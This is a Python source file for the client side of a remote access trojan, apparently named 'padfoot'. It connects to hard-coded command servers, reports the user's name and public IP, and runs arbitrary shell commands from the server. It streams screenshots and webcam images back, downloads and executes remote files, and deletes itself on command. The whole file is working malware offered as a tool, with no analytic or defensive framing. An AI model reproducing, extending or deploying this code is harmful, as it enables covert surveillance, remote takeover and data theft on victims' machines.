import socketio
import requests
import json
import getpass
import os
import subprocess
import threading
import requests
import tkinter.messagebox as tkm
import tkinter as tk
import time
import webbrowser
import base64
import pygetwindow as gw
import pyautogui
from PIL import ImageGrab
from io import BytesIO

DEBUG = True

match DEBUG:
    case True:
        SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us103.gitpod.io'
    case False:
        SERVER = 'https://padfoot-server.onrender.com'

# Connect to the Socket.IO server
sio = socketio.Client()
late_return_list = ['messagebox']
capturing = False

def warn_late_return(command, data):
  return_data = {'output': f'late return warning from {getpass.getuser()}:\ncommand {command} will return late, as it is not an immediate return module.', 'returnAddress': data['returnAddress'], 'immediate': True, 'originalCommand': command}
  sio.emit('commandResponse', return_data)

def suicide():
  os.remove(__file__)

def update(url, location, name, run, is_script):
  r = requests.get(url, allow_redirects=True)
  file_path = f'{location}/{name}'
  open(file_path, 'wb').write(r.content)

  if run:
    if is_script:
      subprocess.run(['python', file_path])
    else:
      subprocess.run([file_path])

    # Delete the currently running file (this script)
    try:
      os.remove(__file__)  # Delete the current script file
    except Exception as e:
      return f"Error deleting file: {e}"

def capture_and_send_image(returnAddress, type):
  global capturing
  while capturing:
    time.sleep(0.3)
    if type == 'screen':
      screenshot = ImageGrab.grab()
      buffer = BytesIO()
      screenshot.save(buffer, format='JPEG')
      image_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
    elif type == 'camera':
      try:
        pygame.init()
        camera_resolution = (640, 480)
        camera = pygame.camera.Camera(pygame.camera.list_cameras()[0], camera_resolution)
        camera.start()
        time.sleep(2)
        image = camera.get_image()
        buffer = BytesIO()
        pygame.image.save(image, buffer)
        image_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        camera.stop()
        pygame.quit()
      except:
        #troll face if error lol
        image_base64 = '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'
    response_data = {'image': image_base64, 'returnAddress': returnAddress}
    sio.emit('imageFromClient', response_data)


def messagbox(title, message, type):
  match type:
    
    case 'info':
      return tkm.showinfo(title, message)
    case 'error':
      return tkm.showerror(title, message)
    case 'askokcancel':
      return tkm.askokcancel(title, message)
    case 'askyesnocancel':
      return tkm.askyesnocancel(title, message)
    case 'askquestion':
      return tkm.askquestion(title, message)
    case 'askretrycancel':
      return tkm.askretrycancel(title, message)
    case _:
      return 'no such messagebox: '+type

def execute_command(command, data):
  command_parts = command.split()
  if command_parts[0] == 'cd':
    if len(command_parts) > 1:
      try:
        os.chdir(command_parts[1])  # Change working directory
        output =  f"Changed working directory to: {os.getcwd()}"
      except Exception as e:
        output = str(e)
  else:
    try:
      output = subprocess.check_output(command, shell=True, text=True)
    except Exception as e:
      output = str(e)

  return_data = {'output': output, 'returnAddress': data['returnAddress'], 'immediate': True, 'originalCommand': command}
  sio.emit('commandResponse', return_data)

def url_open(url, new, autoraise):
  webbrowser.open(url, int(new), eval(autoraise))
  return f'opened {url} in new {new} with autoraise {autoraise}'

@sio.on('connect')
def on_connect():
  print('Connected to server')
  data = {'client': True, 'username': getpass.getuser(), 'ip': requests.get('https://api.ipify.org').content.decode('utf8')} 
  sio.emit('establishment', data)
  
@sio.on('disconnect')
def on_disconnect():
    print('Disconnected from server')

@sio.on('command')
def command(data):
  if data['module']:
    execute_module_stage1(data['command'], data)
  else:      
    execute_command(data['command'], data)

def execute_module_stage1(command, data):
    command_parts = command.split(' ')
    main_command = command_parts[1]
    repeat = int(command_parts[0])
    parameters = {}
    
    for i in range(len(command_parts)):
        if i >= 2:
            parameters[f'param{i-1}'] = command_parts[i]

    print(parameters)
    
    if main_command in late_return_list:
        warn_late_return(command, data)

    for i in range(repeat):
       new_module_thread = threading.Thread(target=execute_module_stage2(parameters, data, command))
       new_module_thread.start()

def execute_module_stage2(parameters, data, command):
    global capturing
    print('executing')
    main_command = command.split(" ")[1]
    print(main_command)
    try:
      if main_command == 'update':
          output = update(parameters['param1'], parameters['param2'], parameters['param3'], parameters['param4'], parameters['param5']) # warning: untested
      elif main_command == 'messagebox':
          output = messagbox(parameters['param1'], parameters['param2'], parameters['param3'])
      elif main_command == 'suicide':
        suicide()
      elif main_command == 'url_open':
        output = url_open(parameters['param1'], parameters['param2'], parameters['param3'])
      elif main_command == 'begin_stream':
          capturing = True
          print(data['returnAddress'])
          immediate = True
          output = 'began stream'
          time.sleep(0.1)  # Add a short delay to ensure the response is sent
          capturing_thread = threading.Thread(target=capture_and_send_image, args=(data['returnAddress'],parameters['param1']))
          capturing_thread.start()
      elif main_command == 'end_stream':
          capturing = False
          immediate = True
          output = 'ended stream'
          print('past everthing')
      else:
          output = f'no such module "{main_command}". Typo?'
          immediate = True
    except Exception as e:
        output = f'Hmmm. error in execute_module_stage2 (sorting and executing modules):\n{str(e)}'
        immediate = True
    
    return_data = {
        'output': output,
        'returnAddress': data['returnAddress'],
        'immediate': True if immediate else False,
        'originalCommand': command
    }
    sio.emit('commandResponse', return_data)
    print('emitted ', return_data)

# Start the connection
sio.connect(SERVER)

# Wait for the connection to establish
sio.wait()
